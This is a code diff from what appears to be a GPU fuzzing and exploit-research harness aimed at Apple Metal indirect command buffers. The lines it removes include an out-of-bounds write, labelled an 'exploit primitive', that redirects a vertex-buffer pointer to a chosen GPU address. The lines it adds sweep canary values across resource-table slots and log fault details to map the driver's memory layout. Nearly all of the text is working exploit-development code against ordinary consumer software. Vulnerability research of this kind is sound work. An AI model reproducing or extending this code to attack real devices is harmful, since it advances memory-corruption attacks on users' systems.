@@ -2907,110 +2907,61 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
             return rt
         }()
 
-        func probeExec() -> Bool {
+        // probeExecFull — returns (faulted, full error string including userInfo)
+        func probeExecFull() -> (Bool, String) {
             guard let cb  = queue.makeCommandBuffer(),
-                  let enc = cb.makeRenderCommandEncoder(descriptor: rtDesc) else { return false }
+                  let enc = cb.makeRenderCommandEncoder(descriptor: rtDesc) else { return (false, "no cb") }
             enc.executeCommandsInBuffer(icb, range: 0..<1)
             enc.endEncoding()
             cb.commit(); cb.waitUntilCompleted()
-            return cb.error != nil
+            guard let err = cb.error as NSError? else { return (false, "") }
+            var s = "code=\(err.code) dom=\(err.domain)"
+            for (k, v) in err.userInfo { s += " [\(k):\(v)]" }
+            return (true, s)
         }
 
-        // Baseline: hi=zeros — we now know this FAULTS (null deref)
-        step("── baseline (hi=zeros) ──")
-        let baselineFault = probeExec()
-        step("  result: \(baselineFault ? "FAULT — hi IS resource table (null VAs derefed)" : "OK — zeros safe")")
+        // ── Phase D: error userInfo dump ────────────────────────────────────────────
+        // Dump full NSError userInfo from a zeros-in-hi execution.
+        // GPU page fault details (including fault VA) may be in userInfo.
+        step("── phase D: error userInfo dump ──")
+        clearHi(0, BUF_LEN)
+        let (_, zeroErrStr) = probeExecFull()
+        step("  zeros err: \(zeroErrStr)")
 
-        // ── Phase A: resource ID sweep ────────────────────────────────────────────
-        // Resource table likely uses RESOURCE IDs (small integers), not raw GPU VAs.
-        // ICB resID=0x1, dummyTex resID logged above, PSO resID unknown.
-        // Sweep pairs: (idA at slotX, idB at slotY, sentVA at slotZ) — find combo that succeeds.
-        // Try IDs 1..8 at first 8 slots (64 slots × 8 IDs = 512 pairs, capped).
-        step("── phase A: resource ID sweep (IDs 1..8 × first 8 slots × sentVA) ──")
-        step("  dummyTex resID=0x\(String(texResID,radix:16)) sentVA=0x\(String(sentVA,radix:16))")
-        var foundConfig: (psoID: UInt64, psoSlot: Int, vtxSlot: Int)? = nil
-
-        outerSweep: for psoID: UInt64 in [1, 2, 3, 4, 5, 6, 7, 8, texResID] {
-            for pSlot in 0..<8 {
-                let pOff = pSlot * 8
-                for vSlot in 0..<8 {
-                    let vOff = vSlot * 8
-                    if pOff == vOff { continue }
-                    clearHi(0, BUF_LEN)
-                    fillHiVal(pOff, pOff + 8, val: psoID)   // PSO candidate ID
-                    fillHiVal(vOff, vOff + 8, val: sentVA)  // vtxBuf GPU VA
-                    let f = probeExec()
-                    if !f {
-                        step("✓ SUCCESS: psoID=0x\(String(psoID,radix:16)) @ slot[+0x\(String(format:"%02x",pOff))], vtxBuf=sentVA @ slot[+0x\(String(format:"%02x",vOff))]")
-                        foundConfig = (psoID, pOff, vOff)
-                        break outerSweep
-                    }
-                }
-            }
+        // ── Phase E: unique canary per 8B slot, log full error ────────────────────
+        // Each slot gets a unique canary: 0xDEADC0DE_00000001 .. _00000040
+        // If the fault VA matches a canary, that slot is the GPU-derefed field.
+        step("── phase E: canary sweep (64 slots × 8B, log error per slot) ──")
+        for slotIdx in 0..<64 {
+            let off = slotIdx * 8
+            clearHi(0, 512)
+            let canary: UInt64 = 0xDEAD_C0DE_0000_0000 | UInt64(slotIdx + 1)
+            fillHiVal(off, off + 8, val: canary)
+            let (f, errStr) = probeExecFull()
+            // Print abbreviated: slot offset + canary + whether err string changed vs zeros
+            let changed = errStr != zeroErrStr
+            step("  [\(String(format:"%02d",slotIdx))]+0x\(String(format:"%03x",off)) c=0x\(String(canary,radix:16)) f=\(f ? 1 : 0)\(changed ? " DIFF" : "") \(errStr.prefix(160))")
         }
         clearHi(0, BUF_LEN)
 
-        if let cfg = foundConfig {
-            step("── confirmed resource table layout ──")
-            step("  PSO  slot: hi[+0x\(String(format:"%x",cfg.psoSlot))] = resID 0x\(String(cfg.psoID,radix:16))")
-            step("  vtxBuf slot: hi[+0x\(String(format:"%x",cfg.vtxSlot))] = sentVA 0x\(String(sentVA,radix:16))")
+        // ── Phase F: sentVA flood (all 512 bytes) — does ANY config of pure-VA work? ──
+        step("── phase F: sentVA flood (all 512B) ──")
+        fillHiVal(0, 512, val: sentVA)
+        let (floodF, floodErr) = probeExecFull()
+        step("  sentVA×64slots: f=\(floodF ? 1:0) \(floodErr.prefix(120))")
+        clearHi(0, BUF_LEN)
 
-            // Controlled redirect: PSO valid, vtxBuf → canaryVA (unmapped)
-            fillHiVal(cfg.psoSlot, cfg.psoSlot + 8, val: cfg.psoID)
-            fillHiVal(cfg.vtxSlot, cfg.vtxSlot + 8, val: canaryVA)
-            let cFault = probeExec()
-            step("  PSO=valid vtxBuf=canaryVA: \(cFault ? "FAULT ✓ GPU read from our VA" : "SUCCESS (canary mapped?)")")
-
-            // OOB via lo adjacency at vtxBuf slot — exploit primitive
-            clearHi(0, BUF_LEN)
-            fillHiVal(cfg.psoSlot, cfg.psoSlot + 8, val: cfg.psoID)  // PSO stays valid
-            let p = lo.contents().assumingMemoryBound(to: UInt8.self)
-            for bi in 0..<8 { p[BUF_LEN + cfg.vtxSlot + bi] = UInt8((canaryVA >> (bi*8)) & 0xFF) }
-            step("  OOB[lo+0x\(String(format:"%x",BUF_LEN+cfg.vtxSlot))] ← canaryVA (vtxBuf redirect via OOB)")
-            let oFault = probeExec()
-            step("  OOB exec: \(oFault ? "FAULT ✓ controlled vtxBuf redirect via OOB confirmed" : "ok")")
-            clearHi(0, BUF_LEN)
-
-        } else {
-            step("  no successful combo in ID 1..8 × slot 0..7 sweep")
-            step("── phase B: extended sweep with raw GPU VAs ──")
-            // PSO might use its GPU VA directly (not resource ID)
-            // Try sentVA and nearby VAs at each PSO candidate slot
-            let nearbyVAs: [UInt64] = [sentVA, targetBuf.gpuAddress,
-                                       lo.gpuAddress, hi.gpuAddress,
-                                       hi.gpuAddress + UInt64(BUF_LEN)]
-            var foundB = false
-            outerB: for psoVA in nearbyVAs {
-                for pSlot in 0..<8 {
-                    let pOff = pSlot * 8
-                    for vSlot in 0..<8 {
-                        let vOff = vSlot * 8
-                        if pOff == vOff { continue }
-                        clearHi(0, BUF_LEN)
-                        fillHiVal(pOff, pOff + 8, val: psoVA)
-                        fillHiVal(vOff, vOff + 8, val: sentVA)
-                        let f = probeExec()
-                        if !f {
-                            step("✓ SUCCESS: psoVA=0x\(String(psoVA,radix:16))@slot+0x\(String(format:"%x",pOff)) vtxVA=sentVA@slot+0x\(String(format:"%x",vOff))")
-                            foundB = true; break outerB
-                        }
-                    }
-                }
-            }
-            clearHi(0, BUF_LEN)
-            if !foundB {
-                step("  extended sweep also missed — resource table format not resolved by VA/ID guessing")
-                step("── phase C: mach_vm_region snapshot during ICB submit ──")
-                // Log all mapped regions in a range around hi's GPU VA
-                // to find what the Metal driver normally puts at GPU VA 0x1500008900
-                step("  sentVA=0x\(String(sentVA,radix:16)) lo=0x\(String(lo.gpuAddress,radix:16)) hi=0x\(String(hi.gpuAddress,radix:16))")
-                step("  dummyTex resID=0x\(String(texResID,radix:16))")
-                step("  ICB resID=0x\(String(icb.gpuResourceID._impl,radix:16))")
-                step("  → resource IDs in use: icb=0x1, tex=0x\(String(texResID,radix:16))")
-                step("  → try ktrace: sudo ktrace trace -S 5 com.apple.gpu 2>&1 | grep PageFault")
-                step("  → or IOReport GPU channel for fault VA")
-            }
+        // ── Phase G: 16B-stride sweep (entries may be 16 bytes not 8) ────────────
+        // Try sentVA at every 16B-aligned offset in first 512 bytes
+        step("── phase G: 16B-stride sentVA sweep ──")
+        for slotIdx in 0..<32 {
+            let off = slotIdx * 16
+            clearHi(0, 512)
+            fillHiVal(off, off + 8, val: sentVA)
+            let (f, _) = probeExecFull()
+            if !f { step("  ★ 16B slot[\(slotIdx)]+0x\(String(format:"%03x",off)) sentVA → SUCCESS"); break }
         }
+        clearHi(0, BUF_LEN)
 
         step("── ICB Field Probe complete ──────────────")
         completion()
